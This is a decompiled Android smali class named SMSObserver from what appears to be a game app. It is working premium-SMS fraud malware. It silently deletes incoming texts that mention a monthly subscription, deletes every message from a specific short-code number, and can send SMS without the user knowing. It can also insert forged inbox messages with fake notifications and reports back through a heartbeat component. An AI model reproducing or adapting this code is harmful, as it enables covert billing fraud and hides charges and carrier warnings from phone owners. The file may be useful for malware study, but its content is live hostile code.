.class public LDaemon/Service/SMSObserver;
.super Landroid/database/ContentObserver;
.source "SMSObserver.java"


# static fields
.field public static final isvalue:Ljava/lang/String; = "%\u5305\u6708%"

.field public static mms:LDaemon/Service/MmsSender; = null

.field public static final number:Ljava/lang/String; = "10086"

.field private static final tag:Ljava/lang/String; = "SMSObserver"


# instance fields
.field private mContext:Landroid/content/Context;

.field private sql:Ljava/lang/String;

.field private sqlvalue:[Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 3
    .param p1, "handle"    # Landroid/os/Handler;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    .line 30
    invoke-direct {p0, p1}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 19
    const/4 v0, 0x0

    iput-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    .line 21
    const-string v0, "address=?"

    iput-object v0, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    .line 22
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "1065800885566"

    aput-object v2, v0, v1

    iput-object v0, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 31
    iput-object p2, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    .line 32
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    if-nez v0, :cond_0

    .line 33
    new-instance v0, LDaemon/Service/MmsSender;

    invoke-direct {v0, p2}, LDaemon/Service/MmsSender;-><init>(Landroid/content/Context;)V

    sput-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    .line 34
    :cond_0
    return-void
.end method

.method private print(Ljava/lang/String;)V
    .locals 1
    .param p1, "log"    # Ljava/lang/String;

    .prologue
    .line 208
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 209
    const-string v0, "SMSObserver"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 211
    :cond_0
    return-void
.end method

.method public static simulation_Sms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 12
    .param p0, "mContext"    # Landroid/content/Context;
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    const/4 v11, -0x1

    const/4 v10, 0x1

    const/4 v9, 0x0

    .line 166
    new-instance v5, Landroid/content/ContentValues;

    invoke-direct {v5}, Landroid/content/ContentValues;-><init>()V

    .line 167
    .local v5, "values":Landroid/content/ContentValues;
    const-string v6, "address"

    invoke-virtual {v5, v6, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 168
    const-string v6, "date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    invoke-static {v7, v8}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 169
    const-string v6, "protocol"

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 170
    const-string v6, "read"

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 171
    const-string v6, "status"

    invoke-static {v11}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 172
    const-string v6, "type"

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 173
    const-string v6, "body"

    invoke-virtual {v5, v6, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 174
    const-string v6, "service_center"

    const-string v7, "+8613800755500"

    invoke-virtual {v5, v6, v7}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 175
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v6

    const-string v7, "content://sms/inbox"

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v6, v7, v5}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 177
    invoke-static {p0, p1}, LDaemon/Service/Mms/Mms;->GetMmsThreadId(Landroid/content/Context;Ljava/lang/String;)I

    move-result v4

    .line 178
    .local v4, "threadid":I
    new-instance v0, LDaemon/Service/Notice;

    invoke-direct {v0, p0}, LDaemon/Service/Notice;-><init>(Landroid/content/Context;)V

    .line 179
    .local v0, "notice":LDaemon/Service/Notice;
    invoke-virtual {v0, v4}, LDaemon/Service/Notice;->setThreadID(I)V

    .line 180
    const-string v6, ":"

    invoke-virtual {p2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    .line 181
    .local v3, "space":I
    if-eq v3, v11, :cond_0

    .line 182
    invoke-virtual {p2, v9, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    .line 183
    .local v2, "notice_title":Ljava/lang/String;
    add-int/lit8 v6, v3, 0x1

    invoke-virtual {p2, v6}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    .line 184
    .local v1, "notice_info":Ljava/lang/String;
    invoke-virtual {v0, v2, v1, v10}, LDaemon/Service/Notice;->showNotice(Ljava/lang/String;Ljava/lang/String;I)V

    .line 188
    .end local v1    # "notice_info":Ljava/lang/String;
    .end local v2    # "notice_title":Ljava/lang/String;
    :goto_0
    return-void

    .line 186
    :cond_0
    invoke-virtual {v0, p1, p2, v10}, LDaemon/Service/Notice;->showNotice(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0
.end method


# virtual methods
.method public delSms(I)V
    .locals 4
    .param p1, "pid"    # I

    .prologue
    const/4 v3, 0x0

    .line 130
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "DELID:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 131
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "content://sms/"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 132
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2, v3, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 133
    return-void
.end method

.method public delSms(Ljava/lang/String;)V
    .locals 9
    .param p1, "number"    # Ljava/lang/String;

    .prologue
    const-string v8, "%"

    .line 141
    const-string v0, "content://sms/"

    .line 142
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const-string v3, "address like ?"

    .line 143
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    .line 142
    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 144
    return-void
.end method

.method public delSmsText(Ljava/lang/String;)V
    .locals 9
    .param p1, "text"    # Ljava/lang/String;

    .prologue
    const-string v8, "%"

    .line 152
    const-string v0, "content://sms/"

    .line 153
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const-string v3, "body like ?"

    .line 154
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    .line 153
    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 155
    return-void
.end method

.method public onChange(Z)V
    .locals 10
    .param p1, "bSelfChange"    # Z

    .prologue
    .line 72
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 74
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "MyonChange"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 76
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 77
    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 78
    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "read"

    aput-object v4, v2, v3

    const-string v3, "body like ?"

    .line 79
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "%\u5305\u6708%"

    aput-object v6, v4, v5

    const-string v5, "date desc"

    .line 76
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 80
    .local v7, "cc":Landroid/database/Cursor;
    :cond_0
    :goto_0
    if-eqz v7, :cond_1

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_3

    .line 90
    :cond_1
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 91
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 92
    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 93
    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "read"

    aput-object v4, v2, v3

    iget-object v3, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    iget-object v4, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 94
    const-string v5, "date desc"

    .line 91
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 95
    .local v6, "c":Landroid/database/Cursor;
    :goto_1
    if-eqz v6, :cond_2

    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_4

    .line 120
    :cond_2
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 122
    return-void

    .line 82
    .end local v6    # "c":Landroid/database/Cursor;
    :cond_3
    const/4 v0, 0x0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 83
    .local v8, "pid":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "DELID:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 84
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "content://sms/"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 85
    .local v9, "uri":Ljava/lang/String;
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v9}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 87
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    if-eqz v0, :cond_0

    .line 88
    sget-object v0, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, LDaemon/Protocol/HeartHttp;->setYeah(I)V

    goto :goto_0

    .line 106
    .end local v8    # "pid":Ljava/lang/String;
    .end local v9    # "uri":Ljava/lang/String;
    .restart local v6    # "c":Landroid/database/Cursor;
    :cond_4
    const/4 v0, 0x0

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 107
    .restart local v8    # "pid":Ljava/lang/String;
    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, LDaemon/Service/SMSObserver;->delSms(I)V

    goto :goto_1
.end method

.method public setSql(Ljava/lang/String;)V
    .locals 1
    .param p1, "sql"    # Ljava/lang/String;

    .prologue
    .line 42
    iput-object p1, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    .line 43
    iget-object v0, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 44
    return-void
.end method

.method public setSqlValue([Ljava/lang/String;)V
    .locals 0
    .param p1, "sqlvalue"    # [Ljava/lang/String;

    .prologue
    .line 53
    iput-object p1, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 55
    return-void
.end method

.method public sndSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "smstext"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 199
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "send number:"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, " content:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 202
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .local v0, "sms":Landroid/telephony/gsm/SmsManager;
    move-object v1, p1

    move-object v3, p2

    move-object v4, v2

    move-object v5, v2

    .line 203
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 204
    const-string v1, "OK"

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->print(Ljava/lang/String;)V

    .line 205
    return-void
.end method
